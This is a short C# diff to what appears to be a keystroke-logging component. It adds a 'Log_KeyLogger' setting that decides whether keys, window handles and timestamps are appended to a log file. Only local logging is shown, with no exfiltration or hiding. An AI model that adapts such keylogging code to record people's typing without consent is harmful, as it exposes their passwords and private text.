@@ -34,10 +34,14 @@ namespace CrcMrc
             iCount = 0;            
             String path = @"KeyLog.txt";
             path = Properties.Settings.Default.FileName;
-            if (!File.Exists(path))
+
+            if (CrcMrc.Properties.Settings.Default.Log_KeyLogger)
             {
-                using (StreamWriter sw = File.CreateText(path))
+                if (!File.Exists(path))
                 {
+                    using (StreamWriter sw = File.CreateText(path))
+                    {
+                    }
                 }
             }
 
@@ -63,7 +67,8 @@ namespace CrcMrc
                         text = converter.ConvertToString(i);
                         using (StreamWriter sw = File.AppendText(path))
                         {
-                            sw.WriteLine(hwnd.ToString().PadRight(15) +  text.PadRight(20) + "@ " + DateTime.Now.ToString() );
+                            if (CrcMrc.Properties.Settings.Default.Log_KeyLogger)
+                                sw.WriteLine(hwnd.ToString().PadRight(15) +  text.PadRight(20) + "@ " + DateTime.Now.ToString());
                             Array.Resize(ref iHwnd, iHwnd.Length + 1);
                             iHwnd.SetValue(hwnd, iHwnd.Length-1);
                         }
